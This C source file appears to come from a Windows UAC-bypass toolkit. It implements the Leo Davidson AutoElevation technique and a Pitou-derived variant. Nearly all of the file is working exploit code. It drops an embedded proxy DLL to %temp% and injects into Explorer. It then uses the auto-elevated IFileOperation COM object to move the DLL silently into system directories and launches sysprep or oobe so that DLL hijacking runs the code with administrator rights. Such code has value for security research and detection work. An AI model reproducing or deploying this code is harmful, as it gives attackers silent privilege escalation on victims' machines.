/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2014 - 2015
*
*  TITLE:       PITOU.C
*
*  VERSION:     1.10
*
*  DATE:        27 Mar 2015
*
*  Leo Davidson work based AutoElevation and Pitou new variant.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"
#include <shlobj.h>

#ifdef _WIN64
#include "dll64.h"
#define INJECTDLL dll64
#else
#include "dll32.h"
#define INJECTDLL dll32
#endif

ELOAD_PARAMETERS g_ElevParams;

/*
* ucmElevatedLoadProc
*
* Purpose:
*
* Bypass UAC using AutoElevated IFileOperation.
* Refactored Leo Davidson concept.
*
*/
DWORD WINAPI ucmElevatedLoadProc(
	PELOAD_PARAMETERS elvpar
	)
{
	HRESULT				r;
	BOOL				cond = FALSE;
	IFileOperation      *FileOperation1 = NULL;
	IShellItem			*isrc = NULL, *idst = NULL;
	BIND_OPTS3			bop;
	SHELLEXECUTEINFOW   shexec;
	WCHAR				textbuf[MAX_PATH * 2], *p, *f, *f0;

	if (elvpar == NULL)
		return (DWORD)E_FAIL;

	r = elvpar->xCoInitialize(NULL);
	if (r != S_OK)
		return r;

	RtlSecureZeroMemory(&bop, sizeof(bop));
	RtlSecureZeroMemory(&shexec, sizeof(shexec));

	do {
		r = elvpar->xCoCreateInstance(&elvpar->xCLSID, NULL,
			CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER | CLSCTX_INPROC_HANDLER, &elvpar->xIID, &FileOperation1);

		if (r != S_OK) {
			break;
		}

		if (FileOperation1 != NULL) {
			FileOperation1->lpVtbl->Release(FileOperation1);
		}

		bop.cbStruct = sizeof(bop);
		bop.dwClassContext = CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER | CLSCTX_INPROC_HANDLER;
		r = elvpar->xCoGetObject(elvpar->EleMoniker, (BIND_OPTS *)&bop, &elvpar->xIID, &FileOperation1);
		if (r != S_OK) {
			break;
		}
		if (FileOperation1 == NULL) {
			r = E_FAIL;
			break;
		}

		FileOperation1->lpVtbl->SetOperationFlags(FileOperation1,
			FOF_NOCONFIRMATION | FOF_SILENT | FOFX_SHOWELEVATIONPROMPT | FOFX_NOCOPYHOOKS | FOFX_REQUIREELEVATION);

		r = elvpar->xSHCreateItemFromParsingName(elvpar->SourceFilePathAndName,
			NULL, &elvpar->xIID_IShellItem, &isrc);

		if (r != S_OK) {
			break;
		}
		r = elvpar->xSHCreateItemFromParsingName(elvpar->DestinationDir, NULL, &elvpar->xIID_IShellItem, &idst);
		if (r != S_OK) {
			break;
		}

		r = FileOperation1->lpVtbl->MoveItem(FileOperation1, isrc, idst, NULL, NULL);
		if (r != S_OK) {
			break;
		}
		r = FileOperation1->lpVtbl->PerformOperations(FileOperation1);
		if (r != S_OK) {
			break;
		}

		idst->lpVtbl->Release(idst);
		idst = NULL;
		isrc->lpVtbl->Release(isrc);
		isrc = NULL;

		shexec.cbSize = sizeof(shexec);
		shexec.fMask = SEE_MASK_NOCLOSEPROCESS;
		shexec.nShow = SW_SHOW;
		shexec.lpFile = elvpar->ExePathAndName;
		shexec.lpParameters = NULL;
		shexec.lpDirectory = elvpar->DestinationDir;
		if (elvpar->xShellExecuteExW(&shexec))
			if (shexec.hProcess != NULL) {
				elvpar->xWaitForSingleObject(shexec.hProcess, INFINITE);
				elvpar->xCloseHandle(shexec.hProcess);
			}

		f0 = textbuf;
		p = (WCHAR *)elvpar->DestinationDir;
		while (*p != (WCHAR)0) {
			*f0 = *p;
			f0++;
			p++;
		}
		*f0 = 0;

		f = (WCHAR *)elvpar->SourceFilePathAndName;
		p = f;
		while (*f != (WCHAR)0) {
			if (*f == (WCHAR)'\\')
				p = (WCHAR *)f + 1;
			f++;
		}

		while (*p != (WCHAR)0) {
			*f0 = *p;
			f0++;
			p++;
		}
		*f0 = 0;

		r = elvpar->xSHCreateItemFromParsingName(textbuf, NULL, &elvpar->xIID_IShellItem, &idst);
		if (r != S_OK) {
			break;
		}

		r = FileOperation1->lpVtbl->DeleteItem(FileOperation1, idst, NULL);
		if (r != S_OK) {
			break;
		}
		FileOperation1->lpVtbl->PerformOperations(FileOperation1);

	} while (cond);

	if (FileOperation1 != NULL) {
		FileOperation1->lpVtbl->Release(FileOperation1);
	}
	if (isrc != NULL) {
		isrc->lpVtbl->Release(isrc);
	}
	if (idst != NULL) {
		idst->lpVtbl->Release(idst);
	}

	elvpar->xCoUninitialize();
	return r;
}

/*
* ucmStandardAutoElevation
*
* Purpose:
*
* Leo Davidson AutoElevation method with derivatives.
*
* M1W7   - Original Leo Davidson concept.
* M1W8   - Windows 8.1 adapted M1W7 (bypassing sysprep embedded manifest dlls redirection).
* M1WALL - WinNT/Pitou derivative from Leo Davidson concept.
*
*/
BOOL ucmStandardAutoElevation(
	DWORD dwType
	)
{
	BOOL		cond = FALSE, bResult = FALSE;
#ifndef _DEBUG
	DWORD		bytesIO;
	HANDLE		hFile = INVALID_HANDLE_VALUE;
#endif
	HINSTANCE   hKrnl, hOle32, hShell32;
	LPWSTR		lpSourceDll, lpTargetDir, lpTargetProcess;
	WCHAR		szBuffer[MAX_PATH + 1];

	switch (dwType) {

	case METHOD_SYSPREP:
		lpSourceDll = M1W7_SOURCEDLL;
		lpTargetDir = M1W7_TARGETDIR;
		lpTargetProcess = M1W7_TARGETPROCESS;
		break;

	case METHOD_SYSPREP_EX:
		lpSourceDll = M1W8_SOURCEDLL;
		lpTargetDir = M1W7_TARGETDIR;
		lpTargetProcess = M1W7_TARGETPROCESS;
		break;

	case METHOD_OOBE:
		lpSourceDll = M1WALL_SOURCEDLL;
		lpTargetDir = M1WALL_TARGETDIR;
		lpTargetProcess = M1WALL_TARGETPROCESS;
		break;

	default:
		return FALSE;
	}

	do {

		// load/reference required dlls 
		hKrnl = GetModuleHandle(KERNEL32DLL);
		hOle32 = GetModuleHandle(OLE32DLL);
		if (hOle32 == NULL) {
			hOle32 = LoadLibrary(OLE32DLL);
			if (hOle32 == NULL)	{
				break;
			}
		}

		hShell32 = GetModuleHandle(SHELL32DLL);
		if (hShell32 == NULL) {
			hShell32 = LoadLibrary(SHELL32DLL);
			if (hShell32 == NULL) {
				break;
			}
		}

		//source filename
		if (ExpandEnvironmentStringsW(lpSourceDll,
			g_ElevParams.SourceFilePathAndName, MAX_PATH) == 0)
		{
			break;
		}
		OutputDebugStringW(g_ElevParams.SourceFilePathAndName);

#ifndef _DEBUG
		//drop proxy dll to %temp%
		hFile = CreateFileW(g_ElevParams.SourceFilePathAndName,
			GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);

		if (hFile == INVALID_HANDLE_VALUE) {
			break;
		}

		WriteFile(hFile, INJECTDLL, sizeof(INJECTDLL), &bytesIO, NULL);
		CloseHandle(hFile);
#endif		
		//dest directory
		RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
		lstrcpyW(szBuffer, lpTargetDir);
		
		if (ExpandEnvironmentStringsW(szBuffer, 
			g_ElevParams.DestinationDir, MAX_PATH) == 0) 
		{
			break;
		}
		
		OutputDebugStringW(g_ElevParams.DestinationDir);

		//target
		RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
		lstrcpyW(szBuffer, lpTargetProcess);
		
		if (ExpandEnvironmentStringsW(szBuffer, 
			g_ElevParams.ExePathAndName, MAX_PATH) == 0) 
		{
			break;
		}
		OutputDebugStringW(g_ElevParams.ExePathAndName);

		//elevation moniker
		lstrcpyW(g_ElevParams.EleMoniker, L"Elevation:Administrator!new:{3ad05575-8857-4850-9277-11b85bdb8e09}");

		g_ElevParams.xIID = IID_IFileOperation;
		g_ElevParams.xIID_IShellItem = IID_IShellItem;
		g_ElevParams.xCLSID = CLSID_FileOperation;

		g_ElevParams.xCoInitialize = (pfnCoInitialize)GetProcAddress(hOle32, "CoInitialize");
		g_ElevParams.xCoCreateInstance = (pfnCoCreateInstance)GetProcAddress(hOle32, "CoCreateInstance");
		g_ElevParams.xCoGetObject = (pfnCoGetObject)GetProcAddress(hOle32, "CoGetObject");
		g_ElevParams.xCoUninitialize = (pfnCoUninitialize)GetProcAddress(hOle32, "CoUninitialize");
		g_ElevParams.xSHCreateItemFromParsingName = (pfnSHCreateItemFromParsingName)GetProcAddress(hShell32, "SHCreateItemFromParsingName");
		g_ElevParams.xShellExecuteExW = (pfnShellExecuteExW)GetProcAddress(hShell32, "ShellExecuteExW");
		g_ElevParams.xWaitForSingleObject = (pfnWaitForSingleObject)GetProcAddress(hKrnl, "WaitForSingleObject");
		g_ElevParams.xCloseHandle = (pfnCloseHandle)GetProcAddress(hKrnl, "CloseHandle");

		bResult = ucmInjectExplorer(&g_ElevParams, ucmElevatedLoadProc);

	} while (cond);

	return bResult;
}
